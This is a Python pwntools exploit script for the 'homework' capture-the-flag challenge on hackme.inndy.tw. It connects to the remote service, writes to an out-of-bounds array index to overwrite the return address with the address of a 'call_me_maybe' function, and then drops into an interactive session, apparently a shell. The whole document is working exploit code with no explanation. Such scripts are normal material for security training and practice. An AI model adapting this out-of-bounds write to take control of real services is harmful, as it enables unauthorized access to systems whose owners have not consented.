#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "hackme.inndy.tw"
port = "7701"

if _local:
	r = process('./homework')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

call_me_maybe = 0x080485fb

print r.recvuntil('? ')
r.sendline('AAAA')

print r.recvuntil(' > ')
r.sendline('1')

print r.recvuntil(': ')
r.sendline(str(0x34 / 4 + 1))

print r.recvuntil('? ')
r.sendline(str(call_me_maybe))

print r.recvuntil(' > ')
r.sendline('0')

r.interactive()